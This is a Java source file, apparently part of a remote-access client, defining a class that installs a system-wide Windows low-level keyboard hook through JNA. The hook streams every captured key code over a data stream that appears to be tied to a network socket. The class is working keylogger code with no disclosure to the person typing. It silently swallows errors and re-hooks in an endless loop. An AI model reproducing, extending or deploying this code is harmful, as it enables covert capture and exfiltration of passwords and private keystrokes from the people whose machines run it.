package me.client.utils;

import com.sun.jna.platform.win32.Kernel32;
import com.sun.jna.platform.win32.User32;
import com.sun.jna.platform.win32.WinDef;
import com.sun.jna.platform.win32.WinUser;
import me.client.Client;

import java.io.DataOutputStream;
import java.io.IOException;
import java.net.Socket;

public class Getkeyboard extends Thread{
    Socket socket;
    public Getkeyboard(Socket socket) {
        this.socket = socket;
    }
    private WinUser.HHOOK hhk;
    private WinUser.LowLevelKeyboardProc keyboardProc = new WinUser.LowLevelKeyboardProc() {
        @Override
        public WinDef.LRESULT callback(int nCode, WinDef.WPARAM wParam, WinUser.KBDLLHOOKSTRUCT event) {
            try {
                if(event.vkCode != 0) {
                    dataOutputStream.writeInt(event.vkCode);
                }
            } catch (IOException e) {
            }
            return com.sun.jna.platform.win32.User32.INSTANCE.CallNextHookEx(hhk, nCode, wParam, null);
        }
    };
    DataOutputStream dataOutputStream;
    public Getkeyboard(DataOutputStream dataOutputStream) {
        this.dataOutputStream = dataOutputStream;
    }
    @Override
    public void run() {
        while (true) {
            setHookOn();
        }
    }
    public void setHookOn() {
        WinDef.HMODULE hMod = Kernel32.INSTANCE.GetModuleHandle(null);
        hhk = com.sun.jna.platform.win32.User32.INSTANCE.SetWindowsHookEx(com.sun.jna.platform.win32.User32.WH_KEYBOARD_LL, keyboardProc, hMod, 0);

        int result;
        WinUser.MSG msg = new WinUser.MSG();
        while ((result = com.sun.jna.platform.win32.User32.INSTANCE.GetMessage(msg, null, 0, 0)) != 0) {
            if (result == -1) {
                setHookOff();
                break;
            } else {
                com.sun.jna.platform.win32.User32.INSTANCE.TranslateMessage(msg);
                com.sun.jna.platform.win32.User32.INSTANCE.DispatchMessage(msg);
            }
        }
    }

    public void setHookOff() {
        User32.INSTANCE.UnhookWindowsHookEx(hhk);
    }
}
